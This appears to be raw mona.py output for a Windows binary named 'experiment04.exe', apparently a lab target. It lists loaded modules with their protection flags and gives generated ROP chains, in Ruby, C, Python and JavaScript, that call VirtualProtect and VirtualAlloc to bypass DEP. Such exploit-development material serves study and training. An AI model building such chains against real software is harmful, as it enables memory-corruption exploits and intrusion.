-----------------------------------------------------------------------------------------------------------------------------------------
 Module info :
-----------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
-----------------------------------------------------------------------------------------------------------------------------------------
 0x76f80000 | 0x7702f000 | 0x000af000 | True   | False   | True  |  True    | True   | 10.0.19041.1806 [COMDLG32.dll] (C:\WINDOWS\SysWOW64\COMDLG32.dll)
 0x776b0000 | 0x7772b000 | 0x0007b000 | True   | False   | True  |  True    | True   | 10.0.19041.789 [msvcp_win.dll] (C:\WINDOWS\SysWOW64\msvcp_win.dll)
 0x766c0000 | 0x767a0000 | 0x000e0000 | True   | False   | True  |  True    | True   | 10.0.19041.2194 [gdi32full.dll] (C:\WINDOWS\SysWOW64\gdi32full.dll)
 0x72970000 | 0x729e4000 | 0x00074000 | True   | False   | True  |  True    | True   | 10.0.19041.2193 [UxTheme.dll] (C:\WINDOWS\SysWOW64\UxTheme.dll)
 0x7abd0000 | 0x7abfc000 | 0x0002c000 | True   | False   | True  |  True    | True   | 10.0.19041.746 [oledlg.dll] (C:\WINDOWS\SysWOW64\oledlg.dll)
 0x77ac0000 | 0x77c64000 | 0x001a4000 | True   | False   | True  |  True    | True   | 10.0.19041.2193 [ntdll.dll] (ntdll.dll)
 0x76910000 | 0x76986000 | 0x00076000 | True   | False   | True  |  True    | True   | 10.0.19041.1865 [sechost.dll] (C:\WINDOWS\SysWOW64\sechost.dll)
 0x00400000 | 0x010b1000 | 0x00cb1000 | False  | False   | False |  True    | False  | 1.0.0.1 [experiment04.exe] (experiment04.exe)
 0x75b10000 | 0x75c00000 | 0x000f0000 | True   | False   | True  |  True    | True   | 10.0.19041.2251 [KERNEL32.DLL] (C:\WINDOWS\SysWOW64\KERNEL32.DLL)
 0x74540000 | 0x74568000 | 0x00028000 | True   | False   | True  |  True    | True   | 10.0.19041.546 [WINMM.dll] (C:\WINDOWS\SysWOW64\WINMM.dll)
 0x75a20000 | 0x75b03000 | 0x000e3000 | True   | False   | True  |  True    | True   | 10.0.19041.1202 [ole32.dll] (C:\WINDOWS\SysWOW64\ole32.dll)
 0x779d0000 | 0x77a15000 | 0x00045000 | True   | False   | True  |  True    | True   | 10.0.19041.2075 [SHLWAPI.dll] (C:\WINDOWS\SysWOW64\SHLWAPI.dll)
 0x76bc0000 | 0x76d5c000 | 0x0019c000 | True   | False   | True  |  True    | True   | 10.0.19041.2251 [USER32.dll] (C:\WINDOWS\SysWOW64\USER32.dll)
 0x76b90000 | 0x76bb6000 | 0x00026000 | True   | False   | True  |  True    | True   | 10.0.19041.2193 [IMM32.dll] (C:\WINDOWS\SysWOW64\IMM32.dll)
 0x76260000 | 0x764e0000 | 0x00280000 | True   | False   | True  |  True    | True   | 10.0.19041.2130 [combase.dll] (C:\WINDOWS\SysWOW64\combase.dll)
 0x75980000 | 0x75a16000 | 0x00096000 | True   | False   | True  |  True    | True   | 10.0.19041.985 [OLEAUT32.dll] (C:\WINDOWS\SysWOW64\OLEAUT32.dll)
 0x75c00000 | 0x75c18000 | 0x00018000 | True   | True    | True  |  True    | True   | 10.0.19041.2251 [win32u.dll] (C:\WINDOWS\SysWOW64\win32u.dll)
 0x75ca0000 | 0x76255000 | 0x005b5000 | True   | False   | True  |  True    | True   | 10.0.19041.2075 [SHELL32.dll] (C:\WINDOWS\SysWOW64\SHELL32.dll)
 0x77090000 | 0x7714e000 | 0x000be000 | True   | False   | True  |  True    | True   | 10.0.19041.1806 [RPCRT4.dll] (C:\WINDOWS\SysWOW64\RPCRT4.dll)
 0x76a70000 | 0x76af7000 | 0x00087000 | True   | False   | True  |  True    | True   | 10.0.19041.1645 [shcore.dll] (C:\WINDOWS\SysWOW64\shcore.dll)
 0x710b0000 | 0x7113d000 | 0x0008d000 | True   | False   | True  |  True    | True   | 5.82.19041.1110 [COMCTL32.dll] (C:\WINDOWS\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.1110_none_c0da534e38c01f4d\COMCTL32.dll)
 0x76d60000 | 0x76f7c000 | 0x0021c000 | True   | False   | True  |  True    | True   | 10.0.19041.2251 [KERNELBASE.dll] (C:\WINDOWS\SysWOW64\KERNELBASE.dll)
 0x76540000 | 0x76660000 | 0x00120000 | True   | True    | True  |  True    | True   | 10.0.19041.789 [ucrtbase.dll] (C:\WINDOWS\SysWOW64\ucrtbase.dll)
 0x76a30000 | 0x76a53000 | 0x00023000 | True   | True    | True  |  True    | True   | 10.0.19041.2130 [GDI32.dll] (C:\WINDOWS\SysWOW64\GDI32.dll)
 0x77880000 | 0x7793f000 | 0x000bf000 | True   | False   | True  |  True    | True   | 7.0.19041.546 [msvcrt.dll] (C:\WINDOWS\SysWOW64\msvcrt.dll)
 0x69a20000 | 0x69a93000 | 0x00073000 | True   | False   | True  |  True    | True   | 10.0.19041.2251 [WINSPOOL.DRV] (C:\WINDOWS\SysWOW64\WINSPOOL.DRV)
 0x75c20000 | 0x75c9b000 | 0x0007b000 | True   | False   | True  |  True    | True   | 10.0.19041.2130 [ADVAPI32.dll] (C:\WINDOWS\SysWOW64\ADVAPI32.dll)
 0x688c0000 | 0x688c6000 | 0x00006000 | True   | True    | True  |  True    | True   | 10.0.19041.1466 [MSIMG32.dll] (C:\WINDOWS\SysWOW64\MSIMG32.dll)
 0x70030000 | 0x70197000 | 0x00167000 | True   | False   | True  |  True    | True   | 10.0.19041.2251 [gdiplus.dll] (C:\WINDOWS\WinSxS\x86_microsoft.windows.gdiplus_6595b64144ccf1df_1.1.19041.2251_none_d9513b1fe1046fc7\gdiplus.dll)
 0x68d50000 | 0x68da3000 | 0x00053000 | True   | False   | True  |  True    | True   | 7.2.19041.746 [OLEACC.dll] (C:\WINDOWS\SysWOW64\OLEACC.dll)
-----------------------------------------------------------------------------------------------------------------------------------------

################################################################################

Register setup for VirtualProtect() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
----------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_ebp:---]
      0x00e186c4,  # POP EBP # RETN [experiment04.exe] 
      0x00e186c4,  # skip 4 bytes [experiment04.exe]
      #[---INFO:gadgets_to_set_ebx:---]
      0x00d34bcf,  # POP EBX # RETN [experiment04.exe] 
      0x00000201,  # 0x00000201-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x00b2515a,  # POP EDX # RETN [experiment04.exe] 
      0x00000040,  # 0x00000040-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x00dd3b2d,  # POP ECX # RETN [experiment04.exe] 
      0x00efe23a,  # &Writable location [experiment04.exe]
      #[---INFO:gadgets_to_set_edi:---]
      0x00d211c9,  # POP EDI # RETN [experiment04.exe] 
      0x00757104,  # RETN (ROP NOP) [experiment04.exe]
      #[---INFO:gadgets_to_set_esi:---]
      0x00b8c6d7,  # POP ESI # RETN [experiment04.exe] 
      0x0074d258,  # JMP [EAX] [experiment04.exe]
      0x00b2a7be,  # POP EAX # RETN [experiment04.exe] 
      0x00f00838,  # ptr to &VirtualProtect() [IAT experiment04.exe]
      #[---INFO:pushad:---]
      0x00b12c66,  # PUSHAD # RETN [experiment04.exe] 
      #[---INFO:extras:---]
      0x008f8e22,  # ptr to 'jmp esp' [experiment04.exe]
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_ebp:---]
      0x00e186c4,  // POP EBP // RETN [experiment04.exe] 
      0x00e186c4,  // skip 4 bytes [experiment04.exe]
      //[---INFO:gadgets_to_set_ebx:---]
      0x00d34bcf,  // POP EBX // RETN [experiment04.exe] 
      0x00000201,  // 0x00000201-> ebx
      //[---INFO:gadgets_to_set_edx:---]
      0x00b2515a,  // POP EDX // RETN [experiment04.exe] 
      0x00000040,  // 0x00000040-> edx
      //[---INFO:gadgets_to_set_ecx:---]
      0x00dd3b2d,  // POP ECX // RETN [experiment04.exe] 
      0x00efe23a,  // &Writable location [experiment04.exe]
      //[---INFO:gadgets_to_set_edi:---]
      0x00d211c9,  // POP EDI // RETN [experiment04.exe] 
      0x00757104,  // RETN (ROP NOP) [experiment04.exe]
      //[---INFO:gadgets_to_set_esi:---]
      0x00b8c6d7,  // POP ESI // RETN [experiment04.exe] 
      0x0074d258,  // JMP [EAX] [experiment04.exe]
      0x00b2a7be,  // POP EAX // RETN [experiment04.exe] 
      0x00f00838,  // ptr to &VirtualProtect() [IAT experiment04.exe]
      //[---INFO:pushad:---]
      0x00b12c66,  // PUSHAD // RETN [experiment04.exe] 
      //[---INFO:extras:---]
      0x008f8e22,  // ptr to 'jmp esp' [experiment04.exe]
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_ebp:---]
      0x00e186c4,  # POP EBP # RETN [experiment04.exe] 
      0x00e186c4,  # skip 4 bytes [experiment04.exe]
      #[---INFO:gadgets_to_set_ebx:---]
      0x00d34bcf,  # POP EBX # RETN [experiment04.exe] 
      0x00000201,  # 0x00000201-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x00b2515a,  # POP EDX # RETN [experiment04.exe] 
      0x00000040,  # 0x00000040-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x00dd3b2d,  # POP ECX # RETN [experiment04.exe] 
      0x00efe23a,  # &Writable location [experiment04.exe]
      #[---INFO:gadgets_to_set_edi:---]
      0x00d211c9,  # POP EDI # RETN [experiment04.exe] 
      0x00757104,  # RETN (ROP NOP) [experiment04.exe]
      #[---INFO:gadgets_to_set_esi:---]
      0x00b8c6d7,  # POP ESI # RETN [experiment04.exe] 
      0x0074d258,  # JMP [EAX] [experiment04.exe]
      0x00b2a7be,  # POP EAX # RETN [experiment04.exe] 
      0x00f00838,  # ptr to &VirtualProtect() [IAT experiment04.exe]
      #[---INFO:pushad:---]
      0x00b12c66,  # PUSHAD # RETN [experiment04.exe] 
      #[---INFO:extras:---]
      0x008f8e22,  # ptr to 'jmp esp' [experiment04.exe]
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%u86c4%u00e1" + // 0x00e186c4 : ,# POP EBP # RETN [experiment04.exe] 
    "%u86c4%u00e1" + // 0x00e186c4 : ,# skip 4 bytes [experiment04.exe]
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%u4bcf%u00d3" + // 0x00d34bcf : ,# POP EBX # RETN [experiment04.exe] 
    "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%u515a%u00b2" + // 0x00b2515a : ,# POP EDX # RETN [experiment04.exe] 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> edx
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%u3b2d%u00dd" + // 0x00dd3b2d : ,# POP ECX # RETN [experiment04.exe] 
    "%ue23a%u00ef" + // 0x00efe23a : ,# &Writable location [experiment04.exe]
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%u11c9%u00d2" + // 0x00d211c9 : ,# POP EDI # RETN [experiment04.exe] 
    "%u7104%u0075" + // 0x00757104 : ,# RETN (ROP NOP) [experiment04.exe]
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%uc6d7%u00b8" + // 0x00b8c6d7 : ,# POP ESI # RETN [experiment04.exe] 
    "%ud258%u0074" + // 0x0074d258 : ,# JMP [EAX] [experiment04.exe]
    "%ua7be%u00b2" + // 0x00b2a7be : ,# POP EAX # RETN [experiment04.exe] 
    "%u0838%u00f0" + // 0x00f00838 : ,# ptr to &VirtualProtect() [IAT experiment04.exe]
    "" + // #[---INFO:pushad:---] : 
    "%u2c66%u00b1" + // 0x00b12c66 : ,# PUSHAD # RETN [experiment04.exe] 
    "" + // #[---INFO:extras:---] : 
    "%u8e22%u008f" + // 0x008f8e22 : ,# ptr to 'jmp esp' [experiment04.exe]
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for VirtualAlloc() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualAlloc()
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
--------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_ebp:---]
      0x008226a9,  # POP EBP # RETN [experiment04.exe] 
      0x008226a9,  # skip 4 bytes [experiment04.exe]
      #[---INFO:gadgets_to_set_ebx:---]
      0x00d34dfa,  # POP EBX # RETN [experiment04.exe] 
      0x00000001,  # 0x00000001-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x009c3a72,  # POP EDX # RETN [experiment04.exe] 
      0x00001000,  # 0x00001000-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x00dd330b,  # POP ECX # RETN [experiment04.exe] 
      0x00000040,  # 0x00000040-> ecx
      #[---INFO:gadgets_to_set_edi:---]
      0x00d3ca1a,  # POP EDI # RETN [experiment04.exe] 
      0x00757104,  # RETN (ROP NOP) [experiment04.exe]
      #[---INFO:gadgets_to_set_esi:---]
      0x00d1ffef,  # POP ESI # RETN [experiment04.exe] 
      0x0074d258,  # JMP [EAX] [experiment04.exe]
      0x00c358c1,  # POP EAX # RETN [experiment04.exe] 
      0x00f00560,  # ptr to &VirtualAlloc() [IAT experiment04.exe]
      #[---INFO:pushad:---]
      0x00b12cec,  # PUSHAD # RETN [experiment04.exe] 
      #[---INFO:extras:---]
      0x008f8ddc,  # ptr to 'jmp esp' [experiment04.exe]
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_ebp:---]
      0x008226a9,  // POP EBP // RETN [experiment04.exe] 
      0x008226a9,  // skip 4 bytes [experiment04.exe]
      //[---INFO:gadgets_to_set_ebx:---]
      0x00d34dfa,  // POP EBX // RETN [experiment04.exe] 
      0x00000001,  // 0x00000001-> ebx
      //[---INFO:gadgets_to_set_edx:---]
      0x009c3a72,  // POP EDX // RETN [experiment04.exe] 
      0x00001000,  // 0x00001000-> edx
      //[---INFO:gadgets_to_set_ecx:---]
      0x00dd330b,  // POP ECX // RETN [experiment04.exe] 
      0x00000040,  // 0x00000040-> ecx
      //[---INFO:gadgets_to_set_edi:---]
      0x00d3ca1a,  // POP EDI // RETN [experiment04.exe] 
      0x00757104,  // RETN (ROP NOP) [experiment04.exe]
      //[---INFO:gadgets_to_set_esi:---]
      0x00d1ffef,  // POP ESI // RETN [experiment04.exe] 
      0x0074d258,  // JMP [EAX] [experiment04.exe]
      0x00c358c1,  // POP EAX // RETN [experiment04.exe] 
      0x00f00560,  // ptr to &VirtualAlloc() [IAT experiment04.exe]
      //[---INFO:pushad:---]
      0x00b12cec,  // PUSHAD // RETN [experiment04.exe] 
      //[---INFO:extras:---]
      0x008f8ddc,  // ptr to 'jmp esp' [experiment04.exe]
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_ebp:---]
      0x008226a9,  # POP EBP # RETN [experiment04.exe] 
      0x008226a9,  # skip 4 bytes [experiment04.exe]
      #[---INFO:gadgets_to_set_ebx:---]
      0x00d34dfa,  # POP EBX # RETN [experiment04.exe] 
      0x00000001,  # 0x00000001-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x009c3a72,  # POP EDX # RETN [experiment04.exe] 
      0x00001000,  # 0x00001000-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x00dd330b,  # POP ECX # RETN [experiment04.exe] 
      0x00000040,  # 0x00000040-> ecx
      #[---INFO:gadgets_to_set_edi:---]
      0x00d3ca1a,  # POP EDI # RETN [experiment04.exe] 
      0x00757104,  # RETN (ROP NOP) [experiment04.exe]
      #[---INFO:gadgets_to_set_esi:---]
      0x00d1ffef,  # POP ESI # RETN [experiment04.exe] 
      0x0074d258,  # JMP [EAX] [experiment04.exe]
      0x00c358c1,  # POP EAX # RETN [experiment04.exe] 
      0x00f00560,  # ptr to &VirtualAlloc() [IAT experiment04.exe]
      #[---INFO:pushad:---]
      0x00b12cec,  # PUSHAD # RETN [experiment04.exe] 
      #[---INFO:extras:---]
      0x008f8ddc,  # ptr to 'jmp esp' [experiment04.exe]
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%u26a9%u0082" + // 0x008226a9 : ,# POP EBP # RETN [experiment04.exe] 
    "%u26a9%u0082" + // 0x008226a9 : ,# skip 4 bytes [experiment04.exe]
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%u4dfa%u00d3" + // 0x00d34dfa : ,# POP EBX # RETN [experiment04.exe] 
    "%u0001%u0000" + // 0x00000001 : ,# 0x00000001-> ebx
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%u3a72%u009c" + // 0x009c3a72 : ,# POP EDX # RETN [experiment04.exe] 
    "%u1000%u0000" + // 0x00001000 : ,# 0x00001000-> edx
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%u330b%u00dd" + // 0x00dd330b : ,# POP ECX # RETN [experiment04.exe] 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> ecx
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%uca1a%u00d3" + // 0x00d3ca1a : ,# POP EDI # RETN [experiment04.exe] 
    "%u7104%u0075" + // 0x00757104 : ,# RETN (ROP NOP) [experiment04.exe]
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%uffef%u00d1" + // 0x00d1ffef : ,# POP ESI # RETN [experiment04.exe] 
    "%ud258%u0074" + // 0x0074d258 : ,# JMP [EAX] [experiment04.exe]
    "%u58c1%u00c3" + // 0x00c358c1 : ,# POP EAX # RETN [experiment04.exe] 
    "%u0560%u00f0" + // 0x00f00560 : ,# ptr to &VirtualAlloc() [IAT experiment04.exe]
    "" + // #[---INFO:pushad:---] : 
    "%u2cec%u00b1" + // 0x00b12cec : ,# PUSHAD # RETN [experiment04.exe] 
    "" + // #[---INFO:extras:---] : 
    "%u8ddc%u008f" + // 0x008f8ddc : ,# ptr to 'jmp esp' [experiment04.exe]
    ""); //  : 


--------------------------------------------------------------------------------------------------

